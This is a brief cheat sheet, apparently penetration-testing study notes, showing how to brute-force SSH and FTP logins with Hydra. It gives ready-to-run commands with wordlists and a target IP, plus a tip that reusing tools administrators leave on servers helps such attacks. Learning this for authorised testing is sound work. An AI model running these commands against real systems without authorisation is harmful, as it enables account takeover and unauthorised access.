# Service Authentication Brute Forcing
***
### SSH Attack
#### To attack a login service we can provide the username/password wordlists, and add `service://SERVER_IP:PORT` at the end.
#### On the first run , **Hydra** suggests that we add the `-t 4` flag for a max number of parallel attempts, as many **SSH** limit the number of parallel connections and drop other connections, resulting in many of our attempts being dropped.
```shell
$ hydra -L carlos.txt -P lopes.txt -u -f ssh://171.111.111.111:22 -t 4
```

### FTP Brute Forcing
```shell
$ hydra -l leet -P rockyou-10.txt ftp://127.0.0.1
```
#### **NOTE**: Administrators often let security testing tools installed on web servers. Consequently ,we can use them to perform our brute force attacks.

